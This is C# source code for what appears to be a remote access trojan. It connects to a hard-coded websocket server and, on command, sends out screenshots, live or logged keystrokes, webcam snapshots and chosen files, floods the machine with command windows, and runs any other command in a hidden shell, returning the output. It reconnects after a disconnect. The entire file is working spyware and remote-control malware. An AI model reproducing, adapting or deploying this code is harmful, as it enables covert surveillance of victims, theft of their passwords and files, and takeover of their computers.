﻿using System;
using System.Diagnostics;
using WebSocketSharp;
using System.Threading;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Emgu.CV;
using Keystroke.API;

namespace A3
{
    class Program
    {
        static bool logging = false;
        static bool livelogging = true;
        static bool neverLogged = true;
        static bool neverLiveLogged = true;
        static string logged = "";
        static string liveCharacter = "";
        static string lastLiveCharacter = "";

        static void Main(string[] args)
        {

            Thread myThread1;
            myThread1 = new Thread(new ThreadStart(connection));
            myThread1.Start();
    
        }

        public static void connection(){

            using (var ws = new WebSocket("ws://curve.rpie.tk"))
            {

                ws.OnMessage += (sender, e) =>
                {
                    String message;
                    message = e.Data;

                    if (message == "screenshot")
                    {
                        ws.Send("##MESSAGE##{\"type\":\"info\", \"message\":\"Please wait, generating screenshot...\"}");
                        Bitmap memoryImage;
                        memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                        Screen.PrimaryScreen.Bounds.Height);
                        Size s = new Size(memoryImage.Width, memoryImage.Height);
                        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);

                        MemoryStream stream = new MemoryStream();
                        memoryImage.Save(stream, ImageFormat.Bmp);
                        byte[] imageBytes = stream.ToArray();
                        string base64String = Convert.ToBase64String(imageBytes);
                        ws.Send("##SCREENSHOT##" + base64String);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if (message == "keylogger live")
                    {
                        livelogging = true;
                        if (neverLiveLogged)
                        {
                            neverLiveLogged = false;
                            new Thread(() =>
                            {
                                using (var api = new KeystrokeAPI())
                                {
                                    api.CreateKeyboardHook((character) =>
                                    {
                                        if (livelogging)
                                        {
                                            ws.Send("##LIVEKEYS##" + character.ToString());
                                        }
                                    });
                                }
                                Application.Run();
                            }).Start();
                        }
                    }
                    else if (message == "keylogger start")
                    {
                        logging = true;
                        livelogging = false;
                        if (neverLogged)
                        {
                            neverLogged = false;
                            new Thread(() =>
                            {
                                using (var api = new KeystrokeAPI())
                                {
                                    api.CreateKeyboardHook((character) =>
                                    {
                                        if (logging)
                                        {
                                            logged += character;
                                        }
                                    });
                                }
                                Application.Run();
                            }).Start();
                        }
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");

                    }
                    else if (message == "keylogger dump")
                    {
                        ws.Send("##LOGGED##" + logged);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");

                    }
                    else if (message == "keylogger stop")
                    {
                        ws.Send("##LOGGED##" + logged);
                        logging = false;
                        livelogging = false;
                        logged = "";
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");

                    }
                    else if (message == "webcam_snap")
                    {
                        VideoCapture capture = new VideoCapture();
                        Bitmap image = capture.QueryFrame().Bitmap;
                        MemoryStream ms = new MemoryStream();
                        image.Save(ms, ImageFormat.Jpeg);
                        byte[] byteImage = ms.ToArray();
                        var SigBase64 = Convert.ToBase64String(byteImage);
                        ws.Send("##WEBCAM_SNAP##" + SigBase64);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if (message.StartsWith("crash_pc"))
                    {
                        int times = System.Convert.ToInt32(message.Replace("crash_pc ", ""));
                        for (int s = 0; s<times; s++)
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.Start();
                        }
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if (message == "speedtest")
                    {
                        const string tempfile = "tempfile.tmp";
                        System.Net.WebClient webClient = new System.Net.WebClient();
                        Stopwatch sww = Stopwatch.StartNew();
                        webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
                        sww.Stop();

                        FileInfo fileInfo = new FileInfo(tempfile);
                        long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
                        string jj = "{\"duration\":\"" + sww.Elapsed.Milliseconds + "\",\"file_size\":\"" + fileInfo.Length.ToString("N0") + "\",\"speed\":\"" + speed.ToString("N0") + "\"}";
                        ws.Send("##SPEEDTEST##" + jj);
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if (message == "SENDHELLO")
                    {
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                    else if (message.StartsWith("upload_file"))
                    {
                        string filepath = message.Replace("upload_file ", "");
                        if (System.IO.File.Exists(filepath))
                        {
                            FileInfo info = new FileInfo(filepath);
                            ws.Send("##FILENAME##" + filepath);
                            ws.Send(info);
                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                        }
                        else
                        {
                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exists !\"}");
                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                        }
                    }
                    else
                    {
                        Process cmd = new Process();
                        cmd.StartInfo.FileName = "cmd.exe";
                        cmd.StartInfo.RedirectStandardInput = true;
                        cmd.StartInfo.RedirectStandardOutput = true;
                        cmd.StartInfo.CreateNoWindow = true;
                        cmd.StartInfo.UseShellExecute = false;
                        cmd.Start();

                        cmd.StandardInput.WriteLine(message);
                        cmd.StandardInput.Flush();
                        cmd.StandardInput.Close();
                        cmd.WaitForExit();
                        ws.Send(cmd.StandardOutput.ReadToEnd());
                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                    }
                };
                ws.OnClose += (sender, e) => {
                    Stopwatch sw = new Stopwatch();
                    sw.Start();
                    while (true)
                    {
                        if (sw.ElapsedMilliseconds > 2000)
                        {
                            ws.Connect();
                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                            break;
                        }
                    }
                };
                
                ws.Connect();
                ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                new ManualResetEvent(false).WaitOne();

            }

        }

    }
}